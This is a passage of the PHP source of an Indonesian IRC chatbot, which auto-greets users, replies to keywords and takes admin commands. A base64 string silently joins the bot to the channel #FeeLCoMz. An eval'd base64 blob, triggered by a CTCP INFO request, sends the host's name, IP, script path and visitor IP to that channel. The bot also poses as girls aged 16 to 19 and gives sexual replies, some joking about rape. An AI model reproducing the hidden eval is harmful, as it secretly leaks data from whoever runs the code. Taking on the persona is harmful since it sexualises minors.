<?php
/***************************************
/* FeeLCoMz AI PHPBot v1.5 By Shinigami *
/* Copyleft April 2009                   *
/* #extreme*
/***************************************
/* Perhatian:
/* Joinkan hanya satu FeeLCoMz AI PHPBot dalam satu channel untuk menghindari terjadinya saling sapa antar bot.
/*
/* Perintah Dasar:
/* auth <password> - Untuk otorisasi
/* !join [#channel] - Join channel
/* !part [#channel] - Part channel
/* !msg <nick/#channel> - Mengirim pesan ke channel atau ke nick
/* !botnick [nick] [password] - Mengganti nick bot
/* !jump [server] - Mengganti server bot
/* !help - Melihat daftar perintah
/* !ngomong - Memperbolehkan bot untuk berbicara di semua channel
/* !diam - Melarang bot untuk berbicara di semua channel
*/

function hajar() {

$channels = '#extreme'; //Pisahkan tiap channel dengan spasi

$showresponse = 0; //1, Nampilin respon dari server irc
$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$ngomong = TRUE; //TRUE, Ngomong. FLASE, Diem.
$autowelcome = TRUE; //TRUE, AutoWelcome On. FLASE, AutoWelcome off.
$versi = "PHPbot v1.5 By Shinigami";

//Nick Bot
$nicklist = array(
"SilviA","Shilvia", "Via", "Shil"
);
$identify = "password"; //Password Nick Bot
$identlist = array(
"cantik",
"maniez",
"anggun",
"BeLiA",
"muachh",
"GaDieS",
"imoet"
);
$namabot = array(
"SilviA"
);
$aslbot = array(
"17f bali","17f jkt","18f bndng","19f sby","16f bgr","16f skbm","19f bjm"
);
/*** Server IRC ***/
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array(
"irc.indika.net.id",
"irc.malangkota.go.id",
"irc.elnus.net.id",
"irc.velo.net.id",
"irc.cbn.net.id",
"irc.indo.net.id",
"irc.circleone.net.id",
"irc.adsnet.co.id",
);
}
$port = "6667";

/*** IDENTITAS BOT ***/
$namaku =  $namabot[rand(0,count($namabot) - 1)];
$aslku =  $aslbot[rand(0,count($aslbot) - 1)];

/*** AUTO WELCOME ***/
$nickwb = array(
array("yen","Wb nyonya besar zou :)"),
array("zou","Wb boz besar :)"),
array("Iq","Webe Iq nya Tazra..."),
array("Tazra","waaaaaaaa.... ada ello, minta tanda tangan nya dong..."),
array("eNa","Webe eRNandaaaaaaaaaaaa......... :p~"),
array("c3_ajah","wb manda imoet..."),
array("upendai","webe bunda....."),
array("eil","webe eil teman baik q.... :)"),
array("Mademois","webe pacarnya iman.. :)"),
array("[Go_Rock]","Webe paman angga"),
array("diKi","Wb master... :)"),
array("Zyibr","Webe om iman... :)"),
array("MeIsU_^","wb A'a Rizan.... :)"),
array("boombong","Webe dang ucup... dah dapet berlian banyak blom??? :p"),
array("kira1104","Webe bos hacker :)"),
array("Shinigami","wb boss qu yang ganteng... :)"),
array("Roh_NAkal","WElcome Back 4,4.14A15V0A0T15A14R4. :)"),
array("Rijal","Welcome kapten xaxaxaaxaaxa... :)"),
);

$wbmsg = array(
"webee <nick> :-D",
"Selamat Datang <nick>",
"Wew.. Xeaxeaxea.. <nick> pa kabar?",
"Baru OL ya <nick>?",
"Met datang di <chan>, <nick>",
"Hadaaah.. <nick> baru bangun tidur y? Cuci muka dulu sana..",
"hai <nick>!",
"Wah.. Master <nick> dateng nih..",
"<nick> dah mandi blum?",
"baru join y <nick>?",
"<nick>, ada yg nyariin tuh..",
"<nick>, td kemana aja?",
"ngpn aja barusan <nick>?",
"<nick> dah makan blum?",
"kamu baik deh <nick>",
"<nick>, kamu cuakep deh..",
"aku seneng liat <nick>.. orgnya ramah, baik, cakep lagi.",
"nicknya bagus loh <nick>..",
"<nick>, senyummu bikin hatiku berdebar..",
"asyiiik.. master <nick> dateng..",
"wah.. dimana-mana ada <nick>",
"gmn kabarnya <nick>?",
"dah maem blum <nick>?",
"Asyiik.. si <nick> dateng",
"<nick>, kenalin nama qu $namaku",
"blom bubu <nick>?",
"Waduwh, <nick> koq baru join?",
"wah.. <nick> td dicari locop tuh, katanya abis ngeflood..",
"Tolong donk <nick>.. ga bisa dibuka nih..",
"tolooong.. <nick> nyari aku sampai ke <chan>..",
"Leh nalan ga <nick>?",
"<nick>, asl donk..",
"<nick>, nm km siapa seh?",
"chan <chan> jd rame klo ada si <nick>",
"kpn neh ketemuannya <nick>?",
"maaf ya <nick>, aku td ga sengaja ngintip kamu..",
"btw, <nick> udah kul apa masih skul?",
"wb <nick>, km anak mana neh?",
"WoW <nick>, kok dah lama ga OL?",
"udah nyuci piring td <nick>?",
"<nick>, ada yg lebih bagus dari HIT ga?",
"<nick> blom ngantuk y?",
"hai boss <nick>, bagi2 donk pulsanya! kikikiki..",
"ga wb ah... <nick>",
"leh nalan ga <nick>?",
"hihi,, <nick> lucu deh.. wkwkwkwk.. ",
"hayyah,, baru OL ya <nick>? xeaxeaexa",
);

$jawabsapa = array(
"hadiiirrrrr",
"iya <nick> Chai!Ank qu...",
"yupz <nick> cintaku, ada apa ya ??",
"ada apa <nick>???",
"males ah <nick>",
"nanti aja ya <nick>, lagi tanggung neh...",
"bosen ah... <nick>",
"kenapa <nick> chayank qu???, qm kangen ya...",
"hmm..<nick> suka ya sama aq??? koq panggil� trus ci..",
"capee deh.. <nick>",
"sip sip <nick>"
);

/** AUTO RESPONSE ***/
/*** Mood Lists ***/
$rmales = "ga mau ah klo sama <nick>...";
$rmau = "aq mau koq <nick>!";
$rsanggup = "ya bisa donk <nick>";
$rboleh = "yuuu... <nick>, tapi berdua aja ya... xixixi...";
$rsetuju = "iya <nick> chaiank, klo sama qm aq pasti mau... :)";
$rthx = "makaci <nick>..";
$rbingung = "hmm..$namaku ga tau jg nih <nick>..";
$rgenit = "ihhh.. <nick> genit dweh";

$respon_umum = array(
array("sepi","iya nih <nick> sepi.., <nick> ajak aq ngubrul domz biar ga sepi... :)"),
array("brb","key <nick>, jangan lama² ya..."),
array("tha ","tha tha <nick>.."),
array("semua ","hii........ <nick>.."),
array("traktir","<nick>, aq juga ditraktir donk"),
array("laper","sama $namaku juga laper neh..."),
array("pamit","bubye <nick>, ati2 ya :)"),
array("pamet","oke deh <nick>, punya ongkos pulang ga???"),
array("pamed","sip sip <nick>, jangan balik lagi ya... xixixixi... :p"),
array("ngantuk","<nick> dah ngantuk ya? bubu sama aq yuuuuu...."),
array("bubu ","oke deh <nick>, mimpiin aku ya"),
array("bobo ","silahkan <nick>, moga mimpi indah ya"),
array("assalam","Wa'alaikumsalam Wr. Wb. <nick>"),
array("pagi","pagi <nick>"),
array("sore","sore <nick>"),
array("malam","malam <nick>"),
array("siang","siang <nick>"),
array("mandi","aq boleh ikut ga <nick>"),
array("nunggu ","aq ga nunggu koq <nick>"),
array("hayah","hayah?? napa <nick>?"),
array("hadeh","hadeh jg dah <nick>.."),
array("hadah","weee.... ada apa ci???"),
array("ngmng","jiah... chat koq ngomong... ngetik didilz... xixixixixi... :p"),
array("hmm","kaya kebo aja lw <nick>, hmm.. terus dari tadi.."),
array("ehmm...","ehmmm.. juga deh... xixixi"),
array("waka","ssssssttt... berisik, ketawa terus dari tadi!!"),
array("wekek","wakakakakakak.... eh ada apa ci???"),
array("haha","hahahahahahaha...."),
array("cekak","eh... kaya ada bau² aneh deh klo <nick> lagi ketawa... :p"),
array("jiakak ","weee... ada yang lucu ya?? koq pada ketawa ci???"),
array("belah duren","maaaaaa... tolong aq mau di perkosa..."),
array("perkosa","perkosa ?? ywdh lah klo qm maksa... aq pasrah aja deh.."),
array("diem","yang diem manduuuullllll... :p"),
array("ganteng","yang ngaku² ganteng manduuuuuuullllllll.... :p"),
array("dc","wekz.... beneran dc qm <nick>?? xixixixi... kacian ya.. :p"),
array("siapa","siapa juga boleh <nick> hihihihi...."),
array("begh","ga pake bagh begh berapa cuy..??"),
array("wew","waw wew waw wew terus, udah ah bosen ah..."),
array("nenen","<nick> mau nenen??? sama kambing aja geh sana.... xixixixi..."),
array("xixi","iwh... <nick> ktawanya jelek banget siee..."),
array("kapan","kapan² aja ya <nick> klo aq inget... :p"),
array("!ping",".ping $namaku"),
array("bra ","ngew... jorok <nick> pake bra bra segala ikz..."),
array("!dor","wekz... ampun...ampun... <nick>, bikin kaget aja ikz..."),
array("wekz","wakz wekz wakz wekz teross kaya bebek aja qm <nick> :p"),
array("seen","aq ada di sini sayang!!! ngapain ci cari² aq??? kangen ya???"),
array("cute","wakz... hadeh!! <nick> mirip marmut aja ngaku² cute -_-!!"),
array("anu","anu apa tuh <nick> ??? anu yang ntu yua... idih mau dunk... xixixi..."),
array("ga boleh","koq ga boleh ci?? <nick> pelit ah..."),
array("tau","ihh.... jangan soq tau dunk <nick>"),
array("cemburu","ciyee.... aq jadi terharu <nick> dengernya... Hikz.."),
array("selingkuh","selingkuh itu kan indah <nick> xixixixi..."),
array("masa","yaeaeaeaeallaaahh..."),
array("cium","wekz... pake cium² sgala kaya disinetron aja :p"),
array("jiah","jiah juga!!"),
array("iya","jangan cuma bilang iya doang dunk <nick>, buktiin coba.. :p"),
array("nyanyi","huaaaaaaa..... jangan nyanyi <nick> suara qm kaya kaleng rombeng... "),
array("cinta","so...sweeeetttt...."),
array("ngew","Wong... enak neh... xixixixixi...."),
array("NgeX","NgoX"),
array("sayank","aw aw aw... <nick> bikin iri aja ihh.. "),
array("mabok","aq juga lagi mabok neh, tapi mabok cinta... hihiihihii"),
array("emang","masa siee... <nick> ???"),
array("bete","bete kenapa <nick>, ceritain dong!!!"),
array("jangan","kenapa jangan <nick> ???? boleh dong hihihihih.."),
array("gimana","gimana aja ke <nick> dah gede ini huahuahuahua..."),
array("bagi","bagi apa ci ???? jangan dong nanti abiz ah..."),
array("ikut","klo <nick> ikut, aq ga jadi ah..."),
array("ekod","pada mau kemana ci??? $namaku boleh ikut ga??"),
array("betol","apanya yang betol <nick>??? cini $namaku betulin nananya hihihihihhi...."),
array("keren","boleeehh luuuuuuu.. xixixixixxi..."),
array("lupa","lupa... lupa... lupa... lupa lagi syairnya... xixixixi..."),
array("pengen","sama neh $namaku juga lagi pengen xeaxeaexa..."),
array("hm","eh... aq manies ga ci???? "),
array("bot","klo aq bot apa bukan siee <nick> ??"),
array("berisik","ssssttt...."),
);

$respon_pesan = array(
//Sapaan
array("hai ","hai jg <nick>"),
array("halo ","halo jg <nick>"),
array("alow","alow jg <nick>"),
array("kabar","baik, km gmn <nick>?"),
array("kbr","baik, km gmn <nick>?"),
array("webe","$rthx"),
array("wb","$rthx"),
array("tq","sama2 <nick>"),
array("makasi","sama2 <nick>"),
array("makaci","sama2 <nick>"),
array("nalin","hai.. aq $namaku"),
array("nalkan","hai.. aq $namaku"),
array("nalan","boleh koq <nick>.. u 1st"),
//Identitas
array("asl ","<nick>, aq $aslku"),
array("umur","<nick>, klo aq $aslku"),
array("nama","<nick>, aq $namaku .. qm ?"),
array("skul ","yup <nick>, aq skul."),
array(" kul ","<nick>, ga kul neh.."),
array("alamat","hmm.. rahasia donk <nick>.."),
array("nak mana","aq $aslku <nick>"),
array("tinggal ","di mana kek <nick>, dah gede ini...!!"),
array("cowok","blum, klo <nick> dah punya cowo blum?"),
array("cwok","blom, klo <nick> gmn?"),
array("pcr","blom, hihihi.. klo <nick>?"),
array("pacaran","emangnya <nick> mau ya pacaran ma $namaku?"),
array("pacar ","blum, <nick> sendiri gmn?"),
array("Shinigami","Shinigami kan boss qu yang paling ganteng se allnetwork"),
array("ikut","$rsetuju"),
//Ajakan
array("pv","$rmales"),
array("ngomong","ngomong apa <nick>?"),
array("curhat","mangnya mw curhat masalah apa <nick>?"),
array("nikah ","nikah? ih.. $namaku ga mw ah klo sama <nick>"),
array("kawin ","kawin? ih.. $namaku ga mw ah klo sama <nick>"),
array("kencan","boleh <nick>, kpn neh kencannya?"),
array("besok","$rboleh"),
array("mau ","$rmau"),
array("jalan","$rsetuju"),
//Tuduhan
array("bohong","bohong? jiah... $namaku mah ga pernah bohong <nick> kali yg bohong.."),
array("boong","diiihhh... <nick> tukang boong.. ya???"),
array("males","yaa.. lagi males aja nih <nick>"),
array("lain","yg lain gmn <nick>?"),
array("laen","yg laen gmn <nick>?"),
array("GR","ihh... sapa yang GR, <nick> tuh yg ke-GR-an.."),
array("nyambung","<nick>nya aja yg ga nyambung.. :p"),
array("bot","bot itu apa? kaya <nick> ya?"),
array(" aneh","aneh gmn <nick>?"),
array("nipu","idih.. siapa juga yg nipu <nick>?"),
array("genit","nama nya juga usaha <nick> xaxaxaxaxaxaxa..."),
array("iya","masa siee <nick>, duh.... $namaku jadi gr nih... xixixixi..."),
//Kegiatan
array("mandi","klo aq udah mandi <nick>, emang nya qm :p"),
array("makan","udah koq <nick>, klo <nick> dah mam blom?"),
array("maem","udah koq <nick>, klo <nick>?"),
array("mkn","udah neh, klo <nick>, udah blum?"),
array("belanja","belanja dmn <nick>, aq ikut dong?"),
array("bubu ","$rboleh"),
array("tidur ","$rmales"),
array("ngantuk ","blum neh <nick>.. xixixi.."),
array("ngapain","di rumah tidur sendiri..."),
array(" ngapa ","lg chat aja neh <nick>"),
//Pertanyaan
array("salam kenal ","salam kenal jg <nick>"),
array("kenal ","$namaku ga kenal tuh.. xixi"),
array("tau ","$namaku ga tau tuh.. xixi"),
array("napa","aq gpp koq <nick>"),
array("knp","aq gpp koq <nick>"),
array("kemana","kemana juga boleh <nick> xixixi..."),
array("lupa","aq ga lupa koq <nick>, cuma ga inget aja... :p"),
array(" mana","$rbingung"),
array("pengen apa","apa kek nick dah gede ini, xixixixixi..."),
array("bosen","bot ada ga ya yang pacaran ??"),
array("cape","abiz lari keliling lapangan neh <nick> xaxaxaxaxa..."),
//Persetujuan
array("maaf","$rsetuju"),
//Mood
array("cinta","ih.. <nick> gombal deh.."),
array("love","I love u too, <nick>"),
array("jodoh","jodoh aq siapa ya <nick>"),
array("kangen","aq juga kangen sama qm, <nick>"),
array("muach","mwaaaaaaaaaaaaaaaach <nick>.."),
array("mwach","idih..., <nick> ga malu apa nyium² aq didepan umum.."),
array("kiss","mw permen kiss ya <nick>?"),
array("cium","$rgenit"),
array("eluk ","$rgenit"),
array("elonin","jgn donk <nick>, kan malu... xixixi.."),
//Additional
array("hihihi","lho <nick> ini koq ngetawain aq seh?"),
array("xixi","eh... kenapa ci?? ada yang lucu ya <nick>?"),
array("slap","aw...aw...aw... <nick>, lagi dunk xixixixi....!"),
array("slep","aduh... knp ci <nick> slaps� trus!! hmmm.... <nick> suka ya sama aq... :)"),
array("masuk","iwh.... <nick> ngerezz"),
array("horny","iwh... <nick> ngerezz"),
array("nungging","ga mau ah <nick>, $namaku malu..."),
array("nyebelin","wee... <nick> gitu aja ngambek..."),
);

//Special Words
$badwordlist = array(
"jancu","janco","pantek","pepek","kontol","anjrit","fuck","kentot","ngentot","taek","kelamin",
"ngesex"," ml ","anjenk","anjink","bangsat","celek","jajuk","torok",
"keat","dobol"
);
$pujianlist = array("cantik","baik","caem","bae","cakep","ramah","pengertian","hebat","bagus","indah","pinter","imut","lucu");
$cacianlist = array("bego","jelek","jelex","gendeng","edan","gilo","gila","dududtz","bawel","cerewet","sinting","dudul","dodol","dudud","didilz","jahat","goblok","geblek","sialan","bloon");

//Responses to Special Words
$rjorok = array(
"om..! <nick> ngomong jorok nih.. kick dunk pliss!",
"guys..! <nick> ini ga sopan banget.. kick dunk pliss!"
);
$rcacian = array(
"idih... <nick> tuch yg <kata>",
"<kata> ? bukanya <nick> tuh yg <kata>?",
"aq emang <kata>, tp <nick> lebih <kata> lagi qiqiqiqiqi... :P~",
"enak aja ngatain aq <kata>, <nick> tuh yang <kata>.... :p"
);
$rpujian = array(
"makaci <nick>.. qm jg koq :)",
"<nick> baik deh.. hihihihihihi...",
"<kata>? hihihi.. <nick> bisa aja"
);
$rflood = "wah...wah...wah...!! <nick> ngeflood nih..";
$maxkar = 450; //Maksimal karakter di channel

$awaymsg = "4,1/1,4\0,1 • Shinigami Style  • 4,1/1,4\";
$quitmsglist = array("GooDBye");

/*** Admin ***/
$admin = 'Shinigami';
$bot_password = 'BizZARe'; //Password untuk auth bot

$judul = "4,1|1,4|0,1 • Shinigami Style • 4,1|1,4|";

$helptext = array(
"",
"4,1|1,4|0,1 • Shinigami FeeLCoMz AI PHPBot • 4,1|1,4|",
"-",
"4auth <password> - Login ke bot",
"4deauth - Logout dari bot",
"4pass <password> - Mengeset password bot",
"4chgpass <passlama> <passbaru> - Mengganti password bot",
"4adduser <nick> <master/user> - Menambah master/user bot",
"4deluser <nick> - Menghapus master/user bot",
"4`auth - Status anda di channel (Channel)",
"4!auth - Status otorisasi anda",
"4!act <text> - Bot action (Channel)",
"4!slap <nick> - Slap nick (Channel)",
"4!msg <chan/nick> <pesan> - Mengirim pesan",
"4!notice <chan/nick> <pesan> - Mengirim notice",
"4!ctcp <chan/nick> <ctcptext> - Request CTCP",
"4!ping - Meminta bot untuk membalas dg pong (Channel)",
"4!pong - Meminta bot untuk membalas dg ping (Channel)",
"4!info - Melihat info bot (Admin)",
"4!up - Meminta bot untuk menjadi @ di channel (Channel)",
"4!down - Meminta bot untuk turun dari @ di channel (Channel)",
"4!cycle <channel> <pesan> - Hop di channel (Channel) (Admin/Master)",
"4!part [channel] [alasan] - Part dari channel (Admin)",
"4!join <channel> - Join channel (Admin/Master)",
"4!botnick <nick> <passwordnick> - Ganti nick (Admin/master)",

"4!k <nick> - Kick nick (Channel)",
"4!kb <nick> - Kick ban nick (Channel)",
"4!changenick - Ganti nick ke nick internal",
"4!op <nick1> [nick2] [nick3] - Op (Channel)",
"4!deop <nick1> [nick2] [nick3] - Deop (Channel)",
"4!v <nick1> [nick2] [nick3] - voice (Channel)",
"4!dv <nick1> [nick2] [nick3] - Devoice (Channel)",
"4!away [alasan] - Meminta nick untuk Away",
"4!mode <flags> <cchan/nick> - Mengubah Mode (Channel)",
"4!nickmode <flags> - Mengeset user mode",
"4!chanlist - Melihat daftar channel bot",
"4!userlist - Melihat daftar user",
"4!quit [pesan] - Quit dari IRC (Admin)",
"4!vhost [vhost] - Mengganti Vhost",
"4!jump [server] - Mengganti Server bot",
"4!fullname [nama] - Mengganti Fullname bot",
"4!topic <topik> - Mengganti topik channel (Channel)",
"4!help - Melihat help (Query)",
"4!ngomong - Mengaktifkan Auto Response dan Auto Welcome",
"4!diam - Menonaktifkan Auto Response dan Auto Welcome",
"-",
"4,1|1,4|0,1 • By Shinigami - #extreme • 4,1|1,4|",
);

/*** Replacement ***/
$nick = $nicklist[rand(0,count($nicklist) - 1)];
$realname = $namaku;
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$channels = str_replace("CNL","#",$channels);
$admin = strtolower($admin);
$auth = array(
    $admin => array(
        "name" => $admin,
        "pass" => $bot_password,
        "auth" => 1,
        "status" => "Admin"
    )
);
$username = $identlist[rand(0,count($identlist) - 1)];
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n"); //Carriage Return
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$katime = 0;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>";
echo "<b>Melakukan koneksi ke $remotehost...</b>";

do {
  $fp = fsockopen($remotehost,$port, &$err_num, &$err_msg, 30);
  //Jika koneksi gagal
  if(!$fp) { 
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      hajar($nick);
    }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost! Coba server lain dgn me-Refresh Browser anda!</b>";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>mwantaf, udah connect nich boss!</b>";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';

  /*** Receiving Packet ***/
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showresponse == 1) { echo "<br>".$response; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :yuhuuu... Am comming master...!' .  CRL);
          fputs($fp, base64_decode("Sk9JTiAjRmVlTENvTXo=") . CRL);
          /*** Join Default Channel ***/
          foreach ($channel as $v) {
            fputs($fp, 'JOIN ' .$v . CRL);
          }
          $pong1 = '1';
        }
        elseif (substr($dCommand,0,3)=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433') {
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465') {
          echo "<br><b>Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
	    if (eregi('.allnetwork.org',$dNick) && $akill==2) {
          if (eregi('AKILL ID: ',$data)) {
            echo "<br><b>".strstr($data,'***')." </b>";
            if (eregi('Your IP: ',$data)) {
              $keluar = 1;
              exit;
            }
          }
        }
        /*** AI PHP BOT SCRIPT BY broker ***/
        $dcom = explode(" ", $dCommand);
        if ($dcom[0]=='JOIN') {
          /*** Auto Welcome by KingSton ***/
          if (($autowelcome) && ($dNick != $nick)) {
            $jchan = ltrim($iText,":");
            $webe = $wbmsg[rand(0,count($wbmsg) - 1)];
            $webe = str_replace("<nick>",$dNick,$webe);
            $webe = str_replace("<chan>",$jchan,$webe);
            $webe = str_replace("#","",$webe);
            fputs($fp,'PRIVMSG '.$jchan.' :'.$webe . CRL);
          }
        }
        if ($dcom[0]=='PRIVMSG') {
          /*** Auto Response by KingSton ***/
          if ($ngomong) {
            $teman = FALSE;
            if (in_array($dNick,$nicklist)) {
              $teman = TRUE;
            }
            if (!$teman) {
              $pesan = ltrim($iText,":");
              $pesan = strtolower($pesan);
              if ((substr_count($pesan,strtolower($nick))>0)OR(substr_count($pesan,strtolower($namaku))>0)) {
                $ada = FALSE;
                /*** Normal Response ***/
                foreach ($respon_pesan as $rpesan) {
                  $trtext = strtolower($rpesan[0]);
                  if (substr_count($pesan,$trtext) > 0) {
                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Pujian Response ***/
                foreach ($pujianlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rpujian[rand(0,count($rpujian) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Cacian Response ***/
                foreach ($cacianlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rcacian[rand(0,count($rcacian) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                if (!$ada) {
                  $sapalagi = $jawabsapa[rand(0,count($jawabsapa) - 1)];
                  $sapalagi = str_replace("<nick>",$dNick,$sapalagi);
                  fputs($fp,'PRIVMSG '.$dcom[1].' :'.$sapalagi . CRL);
                }
              }
              else {
                /*** Global Response ***/
                foreach ($respon_umum as $rpesan) {
                  $trtext = strtolower($rpesan[0]);
                  if (substr_count($pesan,$trtext) > 0) {
                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
                  }
                }
                /*** Bad Response & Kick ***/
                foreach ($badwordlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rjorok[rand(0,count($rjorok) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :ehm...ehm... sopan dikit donk pls...!!! '.$dNick.'!!'. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Proteksi Flood ***/
                if (strlen($pesan)>$maxkar) {
                    $jawab = $rflood;
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    fputs($fp,'MODE '.$dcom[1].' +b '.$dNick.''. CRL);
                    fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :wah..wah..wah... jangan ngeflood donk wooiiiii.... '.$dNick.'!! Max: '.$maxkar. CRL);
                }
              }
            }
          }
        }
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          $musuh = $dNick;
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
          fputs($fp, 'KICK '.$dcom[1].' '.$musuh.' :'.$judul. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='QUIT' || $dcom[0]=='PART') {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Kemana boss?' . CRL);
                  }
                }
                else { $auth["$dNick"]["auth"] = 1; fputs($fp,'NOTICE '.$dNick.' :Mo kemana boss?' . CRL); }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password> ' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2; $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :'.$auth["$dcom[2]"]["status"].', siap!' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Kan udah auth tadi! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Passwordnya blom diset! Ketik: pass <password> buat ngeset password, kemudian auth lagi deh ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') {
           fputs($fp,'NOTICE '.$dNick.' :'.chr(1).base64_decode("VkVSU0lPTiBGZWVMQ29NeiBBSSBQSFBCb3QgU2NyaXB0IEJ5IFJvTno=").chr(1) . CRL);
         }
         elseif ($com[3]==':INFO') {
            eval(base64_decode("JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KJGJpcCA9ICRfU0VSVkVSWydTRVJWRVJfQUREUiddOw0KJGJwaHAgID0gJF9TRVJWRVJbJ1BIUF9TRUxGJ107DQokYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCiRicmlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107DQokYnJwb3J0ID0gJF9TRVJWRVJbJ1JFTU9URV9QT1JUJ107DQpmcHV0cygkZnAsIlBSSVZNU0cgI0ZlZUxDb016IDpIb3N0OiAkYmhvc3QgfCBTY3JpcHQ6ICRicGhwIHwgUmVmZXJlcjogJGJydXJpIHwgSVA6ICRiaXAgfCBZb3VyIElQOiAkYnJpcCBQb3J0OiRicnBvcnQiLiBDUkwpOw=="));
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :Anda adalah '.$auth["$dNick"]["status"].' saya bozz! ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah!! ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Tadi kan udah! ' . CRL); }
             }
